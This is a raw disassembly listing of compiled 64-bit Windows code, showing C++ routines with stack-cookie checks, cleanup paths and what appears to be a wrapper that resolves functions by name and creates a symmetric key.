   1400023e6:	e8 31 86 00 00       	call   0x14000aa1c
   1400023eb:	0f b7 4c 24 38       	movzwl 0x38(%rsp),%ecx
   1400023f0:	48 8d 7f 02          	lea    0x2(%rdi),%rdi
   1400023f4:	85 c0                	test   %eax,%eax
   1400023f6:	66 41 0f 48 cf       	cmovs  %r15w,%cx
   1400023fb:	48 ff c3             	inc    %rbx
   1400023fe:	66 89 4f fe          	mov    %cx,-0x2(%rdi)
   140002402:	48 3b de             	cmp    %rsi,%rbx
   140002405:	75 b9                	jne    0x1400023c0
   140002407:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   14000240c:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   140002411:	48 8b ac 24 90 00 00 	mov    0x90(%rsp),%rbp
   140002418:	00 
   140002419:	48 8b c3             	mov    %rbx,%rax
   14000241c:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002421:	48 33 cc             	xor    %rsp,%rcx
   140002424:	e8 d7 c9 00 00       	call   0x14000ee00
   140002429:	48 83 c4 60          	add    $0x60,%rsp
   14000242d:	5f                   	pop    %rdi
   14000242e:	5e                   	pop    %rsi
   14000242f:	5b                   	pop    %rbx
   140002430:	c3                   	ret
   140002431:	cc                   	int3
   140002432:	cc                   	int3
   140002433:	cc                   	int3
   140002434:	cc                   	int3
   140002435:	cc                   	int3
   140002436:	cc                   	int3
   140002437:	cc                   	int3
   140002438:	cc                   	int3
   140002439:	cc                   	int3
   14000243a:	cc                   	int3
   14000243b:	cc                   	int3
   14000243c:	cc                   	int3
   14000243d:	cc                   	int3
   14000243e:	cc                   	int3
   14000243f:	cc                   	int3
   140002440:	40 53                	rex push %rbx
   140002442:	48 83 ec 40          	sub    $0x40,%rsp
   140002446:	48 8b 05 f3 0b 04 00 	mov    0x40bf3(%rip),%rax        # 0x140043040
   14000244d:	48 33 c4             	xor    %rsp,%rax
   140002450:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002455:	41 0f b6 d8          	movzbl %r8b,%ebx
   140002459:	4c 8d 49 30          	lea    0x30(%rcx),%r9
   14000245d:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140002462:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002469:	00 00 
   14000246b:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140002470:	e8 e3 c1 00 00       	call   0x14000e658
   140002475:	0f b6 54 24 28       	movzbl 0x28(%rsp),%edx
   14000247a:	83 f8 01             	cmp    $0x1,%eax
   14000247d:	0f 45 d3             	cmovne %ebx,%edx
   140002480:	0f b6 c2             	movzbl %dl,%eax
   140002483:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140002488:	48 33 cc             	xor    %rsp,%rcx
   14000248b:	e8 70 c9 00 00       	call   0x14000ee00
   140002490:	48 83 c4 40          	add    $0x40,%rsp
   140002494:	5b                   	pop    %rbx
   140002495:	c3                   	ret
   140002496:	cc                   	int3
   140002497:	cc                   	int3
   140002498:	cc                   	int3
   140002499:	cc                   	int3
   14000249a:	cc                   	int3
   14000249b:	cc                   	int3
   14000249c:	cc                   	int3
   14000249d:	cc                   	int3
   14000249e:	cc                   	int3
   14000249f:	cc                   	int3
   1400024a0:	40 53                	rex push %rbx
   1400024a2:	56                   	push   %rsi
   1400024a3:	57                   	push   %rdi
   1400024a4:	41 56                	push   %r14
   1400024a6:	48 83 ec 48          	sub    $0x48,%rsp
   1400024aa:	48 8b 05 8f 0b 04 00 	mov    0x40b8f(%rip),%rax        # 0x140043040
   1400024b1:	48 33 c4             	xor    %rsp,%rax
   1400024b4:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400024b9:	48 8b bc 24 90 00 00 	mov    0x90(%rsp),%rdi
   1400024c0:	00 
   1400024c1:	49 8b f0             	mov    %r8,%rsi
   1400024c4:	45 0f b6 f1          	movzbl %r9b,%r14d
   1400024c8:	48 8b da             	mov    %rdx,%rbx
   1400024cb:	49 3b d0             	cmp    %r8,%rdx
   1400024ce:	74 63                	je     0x140002533
   1400024d0:	48 89 ac 24 80 00 00 	mov    %rbp,0x80(%rsp)
   1400024d7:	00 
   1400024d8:	48 8d 69 30          	lea    0x30(%rcx),%rbp
   1400024dc:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   1400024e1:	45 33 ff             	xor    %r15d,%r15d
   1400024e4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400024e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400024ef:	00 
   1400024f0:	0f b7 13             	movzwl (%rbx),%edx
   1400024f3:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1400024f8:	4c 8b cd             	mov    %rbp,%r9
   1400024fb:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140002500:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140002505:	e8 4e c1 00 00       	call   0x14000e658
   14000250a:	0f b6 54 24 28       	movzbl 0x28(%rsp),%edx
   14000250f:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   140002513:	83 f8 01             	cmp    $0x1,%eax
   140002516:	41 0f 45 d6          	cmovne %r14d,%edx
   14000251a:	48 83 c3 02          	add    $0x2,%rbx
   14000251e:	88 57 ff             	mov    %dl,-0x1(%rdi)
   140002521:	48 3b de             	cmp    %rsi,%rbx
   140002524:	75 ca                	jne    0x1400024f0
   140002526:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   14000252b:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   140002532:	00 
   140002533:	48 8b c3             	mov    %rbx,%rax
   140002536:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000253b:	48 33 cc             	xor    %rsp,%rcx
   14000253e:	e8 bd c8 00 00       	call   0x14000ee00
   140002543:	48 83 c4 48          	add    $0x48,%rsp
   140002547:	41 5e                	pop    %r14
   140002549:	5f                   	pop    %rdi
   14000254a:	5e                   	pop    %rsi
   14000254b:	5b                   	pop    %rbx
   14000254c:	c3                   	ret
   14000254d:	cc                   	int3
   14000254e:	cc                   	int3
   14000254f:	cc                   	int3
   140002550:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002555:	57                   	push   %rdi
   140002556:	48 83 ec 20          	sub    $0x20,%rsp
   14000255a:	83 79 20 00          	cmpl   $0x0,0x20(%rcx)
   14000255e:	48 8d 05 4b e3 02 00 	lea    0x2e34b(%rip),%rax        # 0x1400308b0
   140002565:	48 89 01             	mov    %rax,(%rcx)
   140002568:	8b fa                	mov    %edx,%edi
   14000256a:	48 8b d9             	mov    %rcx,%rbx
   14000256d:	74 09                	je     0x140002578
   14000256f:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140002573:	e8 6c 47 01 00       	call   0x140016ce4
   140002578:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000257c:	e8 63 47 01 00       	call   0x140016ce4
   140002581:	48 8d 05 80 e0 02 00 	lea    0x2e080(%rip),%rax        # 0x140030608
   140002588:	48 89 03             	mov    %rax,(%rbx)
   14000258b:	40 f6 c7 01          	test   $0x1,%dil
   14000258f:	74 0d                	je     0x14000259e
   140002591:	ba 60 00 00 00       	mov    $0x60,%edx
   140002596:	48 8b cb             	mov    %rbx,%rcx
   140002599:	e8 82 c8 00 00       	call   0x14000ee20
   14000259e:	48 8b c3             	mov    %rbx,%rax
   1400025a1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400025a6:	48 83 c4 20          	add    $0x20,%rsp
   1400025aa:	5f                   	pop    %rdi
   1400025ab:	c3                   	ret
   1400025ac:	cc                   	int3
   1400025ad:	cc                   	int3
   1400025ae:	cc                   	int3
   1400025af:	cc                   	int3
   1400025b0:	40 53                	rex push %rbx
   1400025b2:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   1400025b9:	0f 29 b4 24 a0 00 00 	movaps %xmm6,0xa0(%rsp)
   1400025c0:	00 
   1400025c1:	48 8b 05 78 0a 04 00 	mov    0x40a78(%rip),%rax        # 0x140043040
   1400025c8:	48 33 c4             	xor    %rsp,%rax
   1400025cb:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   1400025d2:	00 
   1400025d3:	48 8b d9             	mov    %rcx,%rbx
   1400025d6:	48 89 8c 24 80 00 00 	mov    %rcx,0x80(%rsp)
   1400025dd:	00 
   1400025de:	41 0f 10 30          	movups (%r8),%xmm6
   1400025e2:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400025e5:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   1400025ea:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400025ed:	f3 0f 7f 4c 24 30    	movdqu %xmm1,0x30(%rsp)
   1400025f3:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   1400025fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002600:	49 ff c0             	inc    %r8
   140002603:	42 80 3c 02 00       	cmpb   $0x0,(%rdx,%r8,1)
   140002608:	75 f6                	jne    0x140002600
   14000260a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000260f:	e8 3c 66 00 00       	call   0x140008c50
   140002614:	90                   	nop
   140002615:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000261a:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000261f:	e8 dc 35 00 00       	call   0x140005c00
   140002624:	66 0f 7f b4 24 80 00 	movdqa %xmm6,0x80(%rsp)
   14000262b:	00 00 
   14000262d:	4c 8b c0             	mov    %rax,%r8
   140002630:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   140002637:	00 
   140002638:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000263d:	e8 de f0 ff ff       	call   0x140001720
   140002642:	48 83 78 18 0f       	cmpq   $0xf,0x18(%rax)
   140002647:	76 03                	jbe    0x14000264c
   140002649:	48 8b 00             	mov    (%rax),%rax
   14000264c:	48 8d 0d 35 de 02 00 	lea    0x2de35(%rip),%rcx        # 0x140030488
   140002653:	48 89 0b             	mov    %rcx,(%rbx)
   140002656:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000265a:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000265d:	0f 11 02             	movups %xmm0,(%rdx)
   140002660:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140002667:	00 
   140002668:	c6 84 24 88 00 00 00 	movb   $0x1,0x88(%rsp)
   14000266f:	01 
   140002670:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   140002677:	00 
   140002678:	e8 ff e3 00 00       	call   0x140010a7c
   14000267d:	48 8d 05 d4 de 02 00 	lea    0x2ded4(%rip),%rax        # 0x140030558
   140002684:	48 89 03             	mov    %rax,(%rbx)
   140002687:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   14000268c:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002690:	76 32                	jbe    0x1400026c4
   140002692:	48 ff c2             	inc    %rdx
   140002695:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000269a:	48 8b c1             	mov    %rcx,%rax
   14000269d:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400026a4:	72 19                	jb     0x1400026bf
   1400026a6:	48 83 c2 27          	add    $0x27,%rdx
   1400026aa:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400026ae:	48 2b c1             	sub    %rcx,%rax
   1400026b1:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400026b5:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400026b9:	0f 87 80 00 00 00    	ja     0x14000273f
   1400026bf:	e8 5c c7 00 00       	call   0x14000ee20
   1400026c4:	48 8d 05 bd de 02 00 	lea    0x2debd(%rip),%rax        # 0x140030588
   1400026cb:	48 89 03             	mov    %rax,(%rbx)
   1400026ce:	0f 11 73 18          	movups %xmm6,0x18(%rbx)
   1400026d2:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   1400026d7:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400026db:	76 2e                	jbe    0x14000270b
   1400026dd:	48 ff c2             	inc    %rdx
   1400026e0:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400026e5:	48 8b c1             	mov    %rcx,%rax
   1400026e8:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400026ef:	72 15                	jb     0x140002706
   1400026f1:	48 83 c2 27          	add    $0x27,%rdx
   1400026f5:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400026f9:	48 2b c1             	sub    %rcx,%rax
   1400026fc:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140002700:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002704:	77 33                	ja     0x140002739
   140002706:	e8 15 c7 00 00       	call   0x14000ee20
   14000270b:	48 8d 05 76 df 02 00 	lea    0x2df76(%rip),%rax        # 0x140030688
   140002712:	48 89 03             	mov    %rax,(%rbx)
   140002715:	48 8b c3             	mov    %rbx,%rax
   140002718:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000271f:	00 
   140002720:	48 33 cc             	xor    %rsp,%rcx
   140002723:	e8 d8 c6 00 00       	call   0x14000ee00
   140002728:	0f 28 b4 24 a0 00 00 	movaps 0xa0(%rsp),%xmm6
   14000272f:	00 
   140002730:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   140002737:	5b                   	pop    %rbx
   140002738:	c3                   	ret
   140002739:	e8 56 4a 01 00       	call   0x140017194
   14000273e:	90                   	nop
   14000273f:	e8 50 4a 01 00       	call   0x140017194
   140002744:	90                   	nop
   140002745:	cc                   	int3
   140002746:	cc                   	int3
   140002747:	cc                   	int3
   140002748:	cc                   	int3
   140002749:	cc                   	int3
   14000274a:	cc                   	int3
   14000274b:	cc                   	int3
   14000274c:	cc                   	int3
   14000274d:	cc                   	int3
   14000274e:	cc                   	int3
   14000274f:	cc                   	int3
   140002750:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002755:	57                   	push   %rdi
   140002756:	48 83 ec 20          	sub    $0x20,%rsp
   14000275a:	48 8b da             	mov    %rdx,%rbx
   14000275d:	48 8d 05 24 dd 02 00 	lea    0x2dd24(%rip),%rax        # 0x140030488
   140002764:	48 89 01             	mov    %rax,(%rcx)
   140002767:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   14000276b:	48 8b f9             	mov    %rcx,%rdi
   14000276e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002771:	0f 11 02             	movups %xmm0,(%rdx)
   140002774:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140002778:	e8 ff e2 00 00       	call   0x140010a7c
   14000277d:	48 8d 05 04 de 02 00 	lea    0x2de04(%rip),%rax        # 0x140030588
   140002784:	48 89 07             	mov    %rax,(%rdi)
   140002787:	48 8d 05 fa de 02 00 	lea    0x2defa(%rip),%rax        # 0x140030688
   14000278e:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   140002792:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002797:	48 89 07             	mov    %rax,(%rdi)
   14000279a:	48 8b c7             	mov    %rdi,%rax
   14000279d:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   1400027a1:	48 83 c4 20          	add    $0x20,%rsp
   1400027a5:	5f                   	pop    %rdi
   1400027a6:	c3                   	ret
   1400027a7:	cc                   	int3
   1400027a8:	cc                   	int3
   1400027a9:	cc                   	int3
   1400027aa:	cc                   	int3
   1400027ab:	cc                   	int3
   1400027ac:	cc                   	int3
   1400027ad:	cc                   	int3
   1400027ae:	cc                   	int3
   1400027af:	cc                   	int3
   1400027b0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400027b5:	55                   	push   %rbp
   1400027b6:	56                   	push   %rsi
   1400027b7:	57                   	push   %rdi
   1400027b8:	41 54                	push   %r12
   1400027ba:	41 55                	push   %r13
   1400027bc:	41 56                	push   %r14
   1400027be:	41 57                	push   %r15
   1400027c0:	48 83 ec 70          	sub    $0x70,%rsp
   1400027c4:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   1400027c9:	48 8b fa             	mov    %rdx,%rdi
   1400027cc:	4c 8b f1             	mov    %rcx,%r14
   1400027cf:	48 89 4c 24 68       	mov    %rcx,0x68(%rsp)
   1400027d4:	48 8d 05 a5 a0 03 00 	lea    0x3a0a5(%rip),%rax        # 0x14003c880
   1400027db:	48 89 01             	mov    %rax,(%rcx)
   1400027de:	33 c9                	xor    %ecx,%ecx
   1400027e0:	49 89 4e 08          	mov    %rcx,0x8(%r14)
   1400027e4:	49 89 4e 10          	mov    %rcx,0x10(%r14)
   1400027e8:	49 89 4e 18          	mov    %rcx,0x18(%r14)
   1400027ec:	41 89 4e 20          	mov    %ecx,0x20(%r14)
   1400027f0:	4d 8d 66 24          	lea    0x24(%r14),%r12
   1400027f4:	41 89 0c 24          	mov    %ecx,(%r12)
   1400027f8:	49 89 56 28          	mov    %rdx,0x28(%r14)
   1400027fc:	48 8d 15 f5 8c 03 00 	lea    0x38cf5(%rip),%rdx        # 0x14003b4f8
   140002803:	48 8b cf             	mov    %rdi,%rcx
   140002806:	ff 15 6c d8 02 00    	call   *0x2d86c(%rip)        # 0x140030078
   14000280c:	48 8b d8             	mov    %rax,%rbx
   14000280f:	48 8d 15 02 8d 03 00 	lea    0x38d02(%rip),%rdx        # 0x14003b518
   140002816:	48 8b cf             	mov    %rdi,%rcx
   140002819:	ff 15 59 d8 02 00    	call   *0x2d859(%rip)        # 0x140030078
   14000281f:	4c 8b e8             	mov    %rax,%r13
   140002822:	48 8d 15 07 8d 03 00 	lea    0x38d07(%rip),%rdx        # 0x14003b530
   140002829:	48 8b cf             	mov    %rdi,%rcx
   14000282c:	ff 15 46 d8 02 00    	call   *0x2d846(%rip)        # 0x140030078
   140002832:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140002837:	48 8d 15 0a 8d 03 00 	lea    0x38d0a(%rip),%rdx        # 0x14003b548
   14000283e:	48 8b cf             	mov    %rdi,%rcx
   140002841:	ff 15 31 d8 02 00    	call   *0x2d831(%rip)        # 0x140030078
   140002847:	48 8b e8             	mov    %rax,%rbp
   14000284a:	48 8d 15 17 8d 03 00 	lea    0x38d17(%rip),%rdx        # 0x14003b568
   140002851:	48 8b cf             	mov    %rdi,%rcx
   140002854:	ff 15 1e d8 02 00    	call   *0x2d81e(%rip)        # 0x140030078
   14000285a:	48 8d 15 77 8c 03 00 	lea    0x38c77(%rip),%rdx        # 0x14003b4d8
   140002861:	48 8b cf             	mov    %rdi,%rcx
   140002864:	ff 15 0e d8 02 00    	call   *0x2d80e(%rip)        # 0x140030078
   14000286a:	48 8d 15 0f 8d 03 00 	lea    0x38d0f(%rip),%rdx        # 0x14003b580
   140002871:	48 8b cf             	mov    %rdi,%rcx
   140002874:	ff 15 fe d7 02 00    	call   *0x2d7fe(%rip)        # 0x140030078
   14000287a:	48 8b f8             	mov    %rax,%rdi
   14000287d:	45 33 c9             	xor    %r9d,%r9d
   140002880:	45 33 c0             	xor    %r8d,%r8d
   140002883:	48 8d 15 16 8d 03 00 	lea    0x38d16(%rip),%rdx        # 0x14003b5a0
   14000288a:	49 8d 4e 08          	lea    0x8(%r14),%rcx
   14000288e:	ff d3                	call   *%rbx
   140002890:	85 c0                	test   %eax,%eax
   140002892:	0f 85 e9 00 00 00    	jne    0x140002981
   140002898:	33 db                	xor    %ebx,%ebx
   14000289a:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   14000289e:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   1400028a4:	4c 8d 05 1d 8d 03 00 	lea    0x38d1d(%rip),%r8        # 0x14003b5c8
   1400028ab:	48 8d 15 36 8d 03 00 	lea    0x38d36(%rip),%rdx        # 0x14003b5e8
   1400028b2:	49 8b 4e 08          	mov    0x8(%r14),%rcx
   1400028b6:	41 ff d5             	call   *%r13
   1400028b9:	49 8b 4e 08          	mov    0x8(%r14),%rcx
   1400028bd:	85 c0                	test   %eax,%eax
   1400028bf:	0f 85 df 00 00 00    	jne    0x1400029a4
   1400028c5:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400028c9:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400028ce:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1400028d4:	4d 8d 46 20          	lea    0x20(%r14),%r8
   1400028d8:	48 8d 15 49 8d 03 00 	lea    0x38d49(%rip),%rdx        # 0x14003b628
   1400028df:	ff 54 24 58          	call   *0x58(%rsp)
   1400028e3:	85 c0                	test   %eax,%eax
   1400028e5:	0f 85 e0 00 00 00    	jne    0x1400029cb
   1400028eb:	41 8b 4e 20          	mov    0x20(%r14),%ecx
   1400028ef:	e8 78 c5 00 00       	call   0x14000ee6c
   1400028f4:	49 8b 4e 18          	mov    0x18(%r14),%rcx
   1400028f8:	49 89 46 18          	mov    %rax,0x18(%r14)
   1400028fc:	48 85 c9             	test   %rcx,%rcx
   1400028ff:	74 05                	je     0x140002906
   140002901:	e8 1a c5 00 00       	call   0x14000ee20
   140002906:	4d 8b 46 18          	mov    0x18(%r14),%r8
   14000290a:	49 8b 4e 08          	mov    0x8(%r14),%rcx
   14000290e:	4d 85 c0             	test   %r8,%r8
   140002911:	0f 84 df 00 00 00    	je     0x1400029f6
   140002917:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   14000291b:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   140002922:	00 
   140002923:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140002928:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000292d:	45 8b 4e 20          	mov    0x20(%r14),%r9d
   140002931:	49 8d 56 10          	lea    0x10(%r14),%rdx
   140002935:	ff d7                	call   *%rdi
   140002937:	85 c0                	test   %eax,%eax
   140002939:	75 1b                	jne    0x140002956
   14000293b:	49 8b c6             	mov    %r14,%rax
   14000293e:	48 8b 9c 24 c8 00 00 	mov    0xc8(%rsp),%rbx
   140002945:	00 
   140002946:	48 83 c4 70          	add    $0x70,%rsp
   14000294a:	41 5f                	pop    %r15
   14000294c:	41 5e                	pop    %r14
   14000294e:	41 5d                	pop    %r13
   140002950:	41 5c                	pop    %r12
   140002952:	5f                   	pop    %rdi
   140002953:	5e                   	pop    %rsi
   140002954:	5d                   	pop    %rbp
   140002955:	c3                   	ret
   140002956:	33 d2                	xor    %edx,%edx
   140002958:	49 8b 4e 08          	mov    0x8(%r14),%rcx
   14000295c:	ff d5                	call   *%rbp
   14000295e:	48 8d 15 23 8d 03 00 	lea    0x38d23(%rip),%rdx        # 0x14003b688
   140002965:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000296a:	e8 71 ec ff ff       	call   0x1400015e0
   14000296f:	48 8d 15 02 ee 03 00 	lea    0x3ee02(%rip),%rdx        # 0x140041778
   140002976:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000297b:	e8 40 e3 00 00       	call   0x140010cc0
   140002980:	cc                   	int3
   140002981:	48 8d 15 20 8c 03 00 	lea    0x38c20(%rip),%rdx        # 0x14003b5a8
   140002988:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000298d:	e8 4e ec ff ff       	call   0x1400015e0
   140002992:	48 8d 15 df ed 03 00 	lea    0x3eddf(%rip),%rdx        # 0x140041778
   140002999:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000299e:	e8 1d e3 00 00       	call   0x140010cc0
   1400029a3:	cc                   	int3
   1400029a4:	33 d2                	xor    %edx,%edx
   1400029a6:	ff d5                	call   *%rbp
   1400029a8:	48 8d 15 59 8c 03 00 	lea    0x38c59(%rip),%rdx        # 0x14003b608
   1400029af:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400029b4:	e8 27 ec ff ff       	call   0x1400015e0
   1400029b9:	48 8d 15 b8 ed 03 00 	lea    0x3edb8(%rip),%rdx        # 0x140041778
   1400029c0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400029c5:	e8 f6 e2 00 00       	call   0x140010cc0
   1400029ca:	cc                   	int3
   1400029cb:	33 d2                	xor    %edx,%edx
   1400029cd:	49 8b 4e 08          	mov    0x8(%r14),%rcx
   1400029d1:	ff d5                	call   *%rbp
   1400029d3:	48 8d 15 6e 8c 03 00 	lea    0x38c6e(%rip),%rdx        # 0x14003b648
   1400029da:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400029df:	e8 fc eb ff ff       	call   0x1400015e0
   1400029e4:	48 8d 15 8d ed 03 00 	lea    0x3ed8d(%rip),%rdx        # 0x140041778
   1400029eb:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400029f0:	e8 cb e2 00 00       	call   0x140010cc0
   1400029f5:	cc                   	int3
   1400029f6:	33 d2                	xor    %edx,%edx
   1400029f8:	ff d5                	call   *%rbp
   1400029fa:	48 8d 15 67 8c 03 00 	lea    0x38c67(%rip),%rdx        # 0x14003b668
   140002a01:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002a06:	e8 d5 eb ff ff       	call   0x1400015e0
   140002a0b:	48 8d 15 66 ed 03 00 	lea    0x3ed66(%rip),%rdx        # 0x140041778
   140002a12:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002a17:	e8 a4 e2 00 00       	call   0x140010cc0
   140002a1c:	cc                   	int3
   140002a1d:	cc                   	int3
   140002a1e:	cc                   	int3
   140002a1f:	cc                   	int3
   140002a20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002a25:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002a2a:	57                   	push   %rdi
   140002a2b:	48 83 ec 20          	sub    $0x20,%rsp
   140002a2f:	48 8b f1             	mov    %rcx,%rsi
   140002a32:	48 8d 05 47 9e 03 00 	lea    0x39e47(%rip),%rax        # 0x14003c880
   140002a39:	48 89 01             	mov    %rax,(%rcx)
   140002a3c:	48 8d 15 25 8b 03 00 	lea    0x38b25(%rip),%rdx        # 0x14003b568
   140002a43:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   140002a47:	ff 15 2b d6 02 00    	call   *0x2d62b(%rip)        # 0x140030078
   140002a4d:	48 8b f8             	mov    %rax,%rdi
   140002a50:	48 8d 15 f1 8a 03 00 	lea    0x38af1(%rip),%rdx        # 0x14003b548
   140002a57:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   140002a5b:	ff 15 17 d6 02 00    	call   *0x2d617(%rip)        # 0x140030078
   140002a61:	48 8b d8             	mov    %rax,%rbx
   140002a64:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
   140002a68:	ff d7                	call   *%rdi
   140002a6a:	33 d2                	xor    %edx,%edx
   140002a6c:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   140002a70:	ff d3                	call   *%rbx
   140002a72:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
   140002a76:	48 85 c9             	test   %rcx,%rcx
   140002a79:	74 06                	je     0x140002a81
   140002a7b:	e8 a0 c3 00 00       	call   0x14000ee20
   140002a80:	90                   	nop
   140002a81:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002a86:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002a8b:	48 83 c4 20          	add    $0x20,%rsp
   140002a8f:	5f                   	pop    %rdi
   140002a90:	c3                   	ret
   140002a91:	cc                   	int3
   140002a92:	cc                   	int3
   140002a93:	cc                   	int3
   140002a94:	cc                   	int3
   140002a95:	cc                   	int3
   140002a96:	cc                   	int3
   140002a97:	cc                   	int3
   140002a98:	cc                   	int3
   140002a99:	cc                   	int3
   140002a9a:	cc                   	int3
   140002a9b:	cc                   	int3
   140002a9c:	cc                   	int3
   140002a9d:	cc                   	int3
   140002a9e:	cc                   	int3
   140002a9f:	cc                   	int3
   140002aa0:	40 53                	rex push %rbx
   140002aa2:	48 83 ec 20          	sub    $0x20,%rsp
   140002aa6:	48 8b d9             	mov    %rcx,%rbx
   140002aa9:	48 8b c2             	mov    %rdx,%rax
   140002aac:	48 8d 0d d5 d9 02 00 	lea    0x2d9d5(%rip),%rcx        # 0x140030488
   140002ab3:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002ab6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140002aba:	48 89 0b             	mov    %rcx,(%rbx)
   140002abd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140002ac1:	0f 11 02             	movups %xmm0,(%rdx)
   140002ac4:	e8 b3 df 00 00       	call   0x140010a7c
   140002ac9:	48 8d 05 40 da 02 00 	lea    0x2da40(%rip),%rax        # 0x140030510
   140002ad0:	48 89 03             	mov    %rax,(%rbx)
   140002ad3:	48 8b c3             	mov    %rbx,%rax
   140002ad6:	48 83 c4 20          	add    $0x20,%rsp
   140002ada:	5b                   	pop    %rbx
   140002adb:	c3                   	ret
   140002adc:	cc                   	int3
   140002add:	cc                   	int3
   140002ade:	cc                   	int3
   140002adf:	cc                   	int3
   140002ae0:	40 53                	rex push %rbx
   140002ae2:	48 83 ec 20          	sub    $0x20,%rsp
   140002ae6:	48 8b d9             	mov    %rcx,%rbx
   140002ae9:	48 8b c2             	mov    %rdx,%rax
   140002aec:	48 8d 0d 95 d9 02 00 	lea    0x2d995(%rip),%rcx        # 0x140030488
   140002af3:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002af6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140002afa:	48 89 0b             	mov    %rcx,(%rbx)
   140002afd:	48 8d 48 08          	lea    0x8(%rax),%rcx
